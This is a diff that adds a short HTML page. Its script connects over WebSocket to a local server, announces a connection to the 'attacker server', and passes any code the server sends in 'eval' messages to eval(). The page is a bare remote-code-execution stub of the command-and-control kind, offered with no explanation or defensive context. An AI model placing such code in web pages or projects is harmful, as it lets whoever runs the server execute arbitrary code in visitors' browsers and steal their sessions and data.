@@ -1,0 +1,25 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title>WebSocket Client</title>
+</head>
+<body>
+    <h1>WebSocket Client</h1>
+
+    <script>
+        const socket = new WebSocket("ws://localhost:8765/");
+    
+        socket.addEventListener("open", function() {
+            alert("Connected to attacker server!");
+        });
+    
+        socket.addEventListener("message", function(event) {
+            const data = JSON.parse(event.data);
+            if (data.type === "eval") {
+                eval(data.code);
+            }
+        });
+    </script>
+    
+</body>
+</html>
